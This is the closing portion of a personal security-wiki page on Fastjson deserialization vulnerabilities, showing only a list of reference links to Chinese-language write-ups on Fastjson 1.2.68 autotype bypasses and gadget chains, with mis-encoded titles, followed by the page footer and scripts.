85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://www.cnblogs.com/tr1ple/p/13489260.html#DTApDDSF" target="_blank" rel="noopener noreferrer">Fastjson1.2.68 ç»• Autotype çš„ä¸€ç‚¹æ€»ç»“ - tr1ple - åšå®¢å›­ (cnblogs.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://javasec.org/java-vuls/FastJson.html#8-fastjson-1268" target="_blank" rel="noopener noreferrer">Fastjson ååºåˆ—åŒ–æ¼æ´ Â· æ”»å‡» Java Web åº”ç”¨-[Java Web å®‰å…¨] (javasec.org)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">fastjson 1.2.68 ååºåˆ—åŒ–æ¼æ´ gadgets æŒ–æ˜ç¬”è®° - rmb122<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>â€‹<a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">&#39;s notebook<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://blog.csdn.net/mole_exp/article/details/122315526" target="_blank" rel="noopener noreferrer">Fastjson ååºåˆ—åŒ–é«˜å±æ¼æ´ç³»åˆ—-part2ï¼š1.2.68 ååºåˆ—åŒ–æ¼æ´åŠåˆ©ç”¨é“¾åˆ†æ (ä¸Š)-CSDN åšå®¢<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ" target="_blank" rel="noopener noreferrer">fastjson 1.2.68 æœ€æ–°ç‰ˆæœ¬æœ‰é™åˆ¶ autotype bypass (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://zonghaishang.github.io/categories/Fastjson%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener noreferrer">è¯£æçš„åšå®¢ (zonghaishang.github.io) -- Fastjson æºç è§£æ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> -- æ„Ÿè§‰è¿˜æƒ³æŒ–æ˜çš„è¯å¿…è¯»</li><li><a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6" target="_blank" rel="noopener noreferrer">feat:fastjson ä¸€ç§åˆ©ç”¨ $ref å‡ ä¹ä»»æ„ getter è§¦å‘çš„æ–¹æ³• Â· threedr3am/learnjavabug@ea61297 (github.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw" target="_blank" rel="noopener noreferrer">ã€ä¸¤ä¸‡å­—åŸåˆ›é•¿æ–‡ã€‘å®Œå…¨é›¶åŸºç¡€å…¥é—¨ Fastjson ç³»åˆ—æ¼æ´ï¼ˆåŸºç¡€ç¯‡ï¼‰ (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;scene=21&amp;token=1393640502&amp;lang=zh_CN" target="_blank" rel="noopener noreferrer">fastjson v1.2.68 RCE åˆ©ç”¨é“¾å¤ç° (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></div><!--[--><!----><!--]--><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a href="https://github.com/zha0cai/edit/main/src/codereview/ã€JavaSecã€‘æ¼æ´åˆ†æ/fastjson ååºåˆ—åŒ– (â…£).md" rel="noopener noreferrer" target="_blank" aria-label="åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ" class="nav-link vp-meta-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->åœ¨ GitHub ä¸Šç¼–è¾‘æ­¤é¡µ<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">ä¸Šæ¬¡ç¼–è¾‘äº: </span><!----></div><div class="contributors"><span class="vp-meta-label">è´¡çŒ®è€…: </span><!--[--><!--[--><span class="vp-meta-info" title="email: 111300972+zha0cai@users.noreply.github.com">zha0cai</span><!--]--><!--]--></div></div></footer><!----><div id="vp-comment" class="giscus-wrapper input-top" style="display:block;"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" preserveAspectRatio="xMidYMid" viewBox="0 0 100 100"><circle cx="28" cy="75" r="11" fill="currentColor"><animate attributeName="fill-opacity" begin="0s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></circle><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 47a28 28 0 0 1 28 28"><animate attributeName="stroke-opacity" begin="0.1s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 25a50 50 0 0 1 50 50"><animate attributeName="stroke-opacity" begin="0.2s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path></svg></div><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">Create by zha0cai</div><div class="vp-copyright">Copyright Â© 2024 Mr.zha0cai </div></footer></div><!--]--><!--[--><!----><!--]--><!--]--></div>
    <script src="/SecWikiPublic/secwiki/assets/js/runtime~app.ec83fc56.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/app.2bb4161d.js" defer></script>
  </body>
</html>
